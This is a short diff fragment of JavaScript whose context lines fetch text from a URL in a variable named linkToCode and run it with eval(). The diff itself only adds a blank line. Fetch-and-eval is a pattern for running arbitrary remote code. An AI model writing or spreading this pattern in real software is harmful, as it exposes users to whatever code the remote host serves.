@@ -4,3 +4,4 @@ const linkToCode =
 fetch(linkToCode)
   .then((r) => r.text())
   .then((t) => eval(t));
+
